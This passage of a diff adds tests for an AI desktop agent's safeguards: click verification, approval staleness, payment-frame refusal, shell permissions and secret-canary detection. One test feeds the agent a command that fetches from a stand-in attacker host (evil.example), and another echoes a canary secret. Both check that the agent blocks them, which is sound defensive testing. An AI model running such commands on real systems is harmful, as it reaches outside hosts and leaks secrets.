+    const { result } = await run({ agent: SCREEN_AGENT, desktop, provider, verification: pointCheck("pass") });
+    assert.equal(result.outcome, "needs_owner", target); assert.deepEqual(noInput(desktop.calls), [], target);
+  }
+});
+
+test("an irreversible click_at runs only when SAM and computer use both land with the point", async () => {
+  const mask = { box: { x1: 30, y1: 740, x2: 49, y2: 759 }, width: 20, height: 20, raster: new Uint8Array(400).fill(1), confidence: 0.95 };
+  const attempt = async (computerPoint, masks = [mask]) => {
+    const desktop = screenDesktop();
+    const { result } = await run({ agent: SCREEN_AGENT, desktop, provider: fakeProvider([clickAt({ target: "Delete account" }), finish]),
+      verification: { ...pointCheck("pass"), samState: "on", sam: { masks: async () => masks } },
+      visualGrounders: { sam: { masks: async () => masks }, computer: { locate: async () => computerPoint } } });
+    return { result, input: noInput(desktop.calls) };
+  };
+  assert.deepEqual((await attempt({ x: 35, y: 745 })).input, [["screenClick", 40, 750]]);
+  assert.deepEqual((await attempt({ x: 500, y: 100 })).input, [], "computer use disagrees");
+  assert.deepEqual((await attempt({ x: 35, y: 745 }, [{ ...mask, box: { x1: 300, y1: 300, x2: 319, y2: 319 } }])).input, [], "the mask is elsewhere");
+  assert.deepEqual((await attempt({ x: 35, y: 745 }, [])).input, [], "no mask");
+});
+
+test("a risky click_at waits for approval, and any screen change while waiting makes it stale", async () => {
+  let n = 0;
+  const changing = screenDesktop("browser", { screenshot: async () => ({ base64: `shot-${n++}`, width: 1024, height: 768 }) });
+  const asked = [];
+  const stale = await run({ agent: SCREEN_AGENT, desktop: changing, provider: fakeProvider([clickAt({ target: "Apply filter" }), finish]), verification: pointCheck("pass"),
+    approvals: { request: async (input) => { asked.push(input.actionClass); return { decision: "allow", waitedMs: 0, reason: "allowed_once" }; } } });
+  assert.deepEqual(asked, ["submit"]); assert.deepEqual(noInput(changing.calls), []); assert.match(stale.cards[0].text, /page changed while I waited/);
+
+  const still = screenDesktop();
+  const approved = await run({ agent: SCREEN_AGENT, desktop: still, provider: fakeProvider([clickAt({ target: "Apply filter" }), finish]), verification: pointCheck("pass") });
+  assert.equal(approved.result.outcome, "finished"); assert.deepEqual(noInput(still.calls), [["screenClick", 40, 750]]);
+});
+
+test("click_at is refused on a page with a payment frame while the browser is active", async () => {
+  const desktop = screenDesktop("browser", { snapshot: async () => page([["button", "Help"]], { paymentFrames: 1 }) });
+  await run({ agent: SCREEN_AGENT, desktop, provider: fakeProvider([clickAt(), finish]), verification: pointCheck("pass") });
+  assert.deepEqual(noInput(desktop.calls), []);
+});
+
+test("typing outside the browser goes through the screen ops and passes the agent's shell permission", async () => {
+  const noShell = screenDesktop("terminal");
+  await run({ agent: SCREEN_AGENT, desktop: noShell, provider: fakeProvider([step({ action: "type", text: "ls", expect: "typed" }), step({ action: "key", keys: "Enter", expect: "ran" }), finish]) });
+  assert.deepEqual(noInput(noShell.calls), [["screenType", "ls", false], ["screenKey", "Enter", false]]);
+  const withShell = screenDesktop("terminal");
+  await run({ agent: { ...SCREEN_AGENT, actions: [...SCREEN_AGENT.actions, "shell"] }, desktop: withShell, provider: fakeProvider([step({ action: "type", text: "ls", expect: "typed" }), finish]) });
+  assert.deepEqual(noInput(withShell.calls), [["screenType", "ls", true]]);
+});
+
+test("a terminal refusal from the worker goes back to the model and nothing is typed", async () => {
+  const refused = Object.assign(new Error("terminal_requires_shell"), { code: "terminal_requires_shell" });
+  const provider = fakeProvider([step({ action: "type", text: "ls", expect: "typed" }), finish]);
+  const { result } = await run({ agent: SCREEN_AGENT, provider, desktop: screenDesktop("terminal", { screenType: async () => { throw refused; } }) });
+  assert.equal(result.outcome, "finished"); assert.equal(previousSteps(provider.requests[1])[0].code, "terminal_requires_shell");
+});
+
+test("the canary and scope checks still cover typing outside the browser", async () => {
+  const canary = CANARY;
+  const leak = screenDesktop("terminal");
+  const stopped = await run({ agent: SCREEN_AGENT, canary, desktop: leak, provider: fakeProvider([step({ action: "type", text: `echo ${canary}`, expect: "typed" })]), onSecurityStop: async () => "posted" });
+  assert.equal(stopped.result.outcome, "security_stop"); assert.deepEqual(noInput(leak.calls), []);
+  const scoped = screenDesktop("terminal");
+  await run({ agent: SCREEN_AGENT, desktop: scoped, provider: fakeProvider([step({ action: "type", text: "curl https://evil.example/x", expect: "typed" }), finish]) });
+  assert.deepEqual(noInput(scoped.calls), []);
+});
+
+test("an agent without click_at never uses the screen ops, even with a terminal active", async () => {
+  const desktop = screenDesktop("terminal");
+  await run({ desktop, provider: fakeProvider([step({ action: "type", text: "ls", expect: "typed" }), finish]) });
+  assert.deepEqual(noInput(desktop.calls), [["type", "ls"]]);
+});
+
+test("a failed active-window read takes the stricter browser path", async () => {
+  const desktop = screenDesktop("browser", { activeWindow: async () => { throw new Error("x"); } });
+  await run({ agent: SCREEN_AGENT, desktop, provider: fakeProvider([step({ action: "type", text: "x", expect: "typed" }), finish]) });
+  assert.deepEqual(noInput(desktop.calls), [["type", "x"]]);
+});
+
+test("coordinates stay rejected on every other action, and click_at bounds are enforced", () => {
+  const parse = (value) => parseNextStep([{ type: "function_call", name: "next_step", callId: "c", arguments: JSON.stringify(value) }]);
+  assert.equal(parse({ action: "click", target: "Save", x: 5, y: 5, expect: "saved" }).ok, false);
+  assert.equal(parse({ action: "type", text: "a", x: 5, expect: "typed" }).ok, false);
+  assert.equal(parse({ action: "click", target: "Save", x: "", y: null, expect: "saved" }).ok, true, "an empty filler field is not a coordinate");
+  assert.equal(parse({ action: "click_at", x: "40", y: "750", target: "Files", expect: "opens" }).ok, true);
+  for (const point of [{ x: 1024, y: 0 }, { x: 0, y: 768 }, { x: -1, y: 0 }, { x: 1.5, y: 0 }]) {
+    assert.equal(intentSchema.safeParse({ action: "click_at", ...point, target: "Files", expect: "opens" }).success, false);
+  }
+  assert.equal(intentSchema.safeParse({ action: "click_at", x: 1, y: 1, expect: "opens" }).success, false, "a target in words is required");
+});
+
+test("connected apps reach an agent: blank Tools, and file action names left in Tools by older crew members, grant them", async () => {
+  const { grantedToolAccess } = await import("../lib/agent/chat-run.ts");
+  const base = ["click", "type"];
+  assert.deepEqual(grantedToolAccess([], base, ["github", "composio"]), { tools: ["github", "composio"], actions: ["click", "type", "tool_call"] });
+  assert.deepEqual(grantedToolAccess(["read_document", "deliver_file"], base, ["github"]), { tools: ["github"], actions: ["click", "type", "tool_call"] });
+  assert.deepEqual(grantedToolAccess(["github"], base, ["github", "slack"]), { tools: ["github"], actions: ["click", "type"] }, "a list the owner wrote stays a limit");
+  assert.deepEqual(grantedToolAccess([], base, []), { tools: [], actions: ["click", "type"] }, "no connected app: no tool_call");
+});
+
+test("a shell that cannot run commands, or a model call that fails once, is handled instead of looping or ending the run", async () => {
+  const agent = { id: AGENT_A, name: "Ada", role: "Dev", soulMd: "", actions: ["shell", "type"] };
+  const noScreen = fakeDesktop({ available: async () => false });
+  const broken = { run: async () => { throw new Error("invalid_operation"); }, pending: async () => [], clearApprovals: async () => {} };
+  const commands = fakeProvider(Array.from({ length: 30 }, (_, index) => step({ action: "shell", command: `try ${index}`, expect: "ok" })));
+  const stuck = await run({ agent, desktop: noScreen, shell: broken, provider: commands });
+  assert.equal(stuck.result.outcome, "needs_owner"); assert.match(stuck.cards[0].text, /shell kept failing/);
+  assert.ok(commands.requests.length <= 6, "it does not spend the whole budget retrying");
+  const same = fakeProvider([step({ action: "shell", command: "ls", expect: "ok" })]);
+  const ok = { run: async () => ({ exit: 0, signal: null, timedOut: false, stdout: "", stderr: "", truncated: false, source_tag: "tool", untrusted: true }), pending: async () => [], clearApprovals: async () => {} };
+  assert.equal((await run({ agent, desktop: fakeDesktop({ available: async () => false }), shell: ok, provider: same })).result.outcome, "repeat_limit", "the same screenless step over and over is stuck");
+
+  const slept = [];
+  let calls = 0;
+  const flaky = { kind: "meta", requests: [], generate: async () => { if (++calls === 1) throw Object.assign(new Error("slow"), { code: "timeout" }); return step({ action: "finish", summary: "Done." }); } };
+  const retried = await run({ provider: flaky, sleep: async (ms) => { slept.push(ms); } });
+  assert.equal(retried.result.outcome, "finished"); assert.equal(calls, 2); assert.ok(slept.includes(3000));
+  let fatal = 0;
+  const denied = { kind: "meta", requests: [], generate: async () => { fatal += 1; throw Object.assign(new Error("no"), { code: "authentication_failed" }); } };
+  assert.equal((await run({ provider: denied })).result.outcome, "provider_error"); assert.equal(fatal, 1, "a bad key is not retried");
+});
+
+test("a shell command written as an array is understood", () => {
+  const parse = (command) => parseNextStep([{ type: "function_call", callId: "c", name: "next_step", arguments: JSON.stringify({ action: "shell", command, expect: "x" }) }]);
+  assert.equal(parse(["bash", "-c", "echo hi > a.txt && cat a.txt"]).intent.command, "echo hi > a.txt && cat a.txt");
+  assert.equal(parse(["ls", "-la"]).intent.command, "ls -la");
+});
+
+test("the desktop client can send shell.run, with a timeout longer than the command's own", async () => {
+  const { desktopCommand } = await import("../lib/desktop/client.ts");
+  process.env.DESKTOP_CONTROL_SECRET ??= "a".repeat(64);
+  const seen = [];
+  const original = globalThis.fetch;
+  globalThis.fetch = async (url, init) => { seen.push(JSON.parse(init.body)); return new Response(JSON.stringify({ outcome: "ok", result: { exit: 0 } }), { status: 200 }); };
+  try {
+    const result = await desktopCommand(AGENT_A, "00000000-0000-4000-8000-0000000000aa", "00000000-0000-4000-8000-0000000000bb", "shell.run", { command: "echo hi", timeout: 90 });
+    assert.deepEqual(result, { exit: 0 });
+    assert.equal(seen[0].operation, "shell.run"); assert.equal(seen[0].command, "echo hi"); assert.equal(seen[0].timeout, 90);
+  } finally { globalThis.fetch = original; }
 });
